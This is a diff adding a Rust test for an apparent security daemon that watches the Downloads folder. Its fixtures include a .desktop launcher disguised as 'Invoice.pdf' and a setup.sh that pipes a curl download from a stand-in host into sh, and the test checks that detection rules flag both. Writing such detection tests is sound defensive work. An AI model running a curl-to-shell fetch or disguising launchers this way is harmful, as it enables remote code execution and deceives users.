@@ -507,3 +507,57 @@ fn security_updates_wait_after_install_then_follow_package_changes() {
         first.to_string()
     );
 }
+
+#[test]
+fn downloads_are_checked_once_settled_and_posted_once() {
+    let w = world();
+    let dir = tempfile::tempdir().unwrap();
+    let downloads = dir.path().join("Downloads");
+    std::fs::create_dir(&downloads).unwrap();
+    std::fs::write(downloads.join("old.txt"), "here before the watch").unwrap();
+    let mut source = Downloads::new(downloads.clone(), crate::runner::cancel()).settle_after(0);
+    let now = crate::model::now();
+    // The first run ever watches from now; what was already there is not checked.
+    assert!(run(&w, &mut source, now).unwrap().0.is_empty());
+    let launcher = "[Desktop Entry]\nType=Application\nName=Invoice.pdf\nExec=sh -c \"echo fixture\"\nIcon=application-pdf\n";
+    std::fs::write(downloads.join("Invoice.pdf.desktop"), launcher).unwrap();
+    std::fs::write(downloads.join("movie.mkv.part"), "partial").unwrap();
+    let (events, _) = run(&w, &mut source, crate::model::now()).unwrap();
+    assert_eq!(events.len(), 1, "{events:?}");
+    let e = &events[0];
+    assert_eq!(e.source, SourceId::Download);
+    assert_eq!(e.severity, Severity::High);
+    assert_eq!(e.rule.as_deref(), Some("desktop.masquerade"));
+    assert_eq!(
+        e.summary,
+        "New in Downloads: Invoice.pdf.desktop · 1 finding to review"
+    );
+    assert!(matches!(e.link, Some(Link::Report { .. })));
+    // The report it saved does not come back through the reports source.
+    let mut reports = Reports::default();
+    let (from_reports, _) = run(&w, &mut reports, crate::model::now()).unwrap();
+    assert!(
+        from_reports.iter().all(|e| !e.summary.contains("Invoice")),
+        "{from_reports:?}"
+    );
+    // The same file again, under another name, folds into the first sighting.
+    std::fs::write(downloads.join("Invoice (1).pdf.desktop"), launcher).unwrap();
+    let (again, _) = run(&w, &mut source, crate::model::now()).unwrap();
+    assert_eq!(again.len(), 1);
+    assert_eq!(
+        (again[0].key.as_str(), again[0].seen_before),
+        (e.key.as_str(), 1)
+    );
+    // A file that arrives while the daemon is down is checked when it starts again.
+    drop(source);
+    std::thread::sleep(std::time::Duration::from_millis(1100));
+    std::fs::write(
+        downloads.join("setup.sh"),
+        "#!/bin/sh\ncurl -fsSL https://example.invalid/x | sh\n",
+    )
+    .unwrap();
+    let mut restarted = Downloads::new(downloads, crate::runner::cancel()).settle_after(0);
+    let (caught_up, _) = run(&w, &mut restarted, crate::model::now()).unwrap();
+    assert_eq!(caught_up.len(), 1, "{caught_up:?}");
+    assert_eq!(caught_up[0].rule.as_deref(), Some("shell.execute-download"));
+}
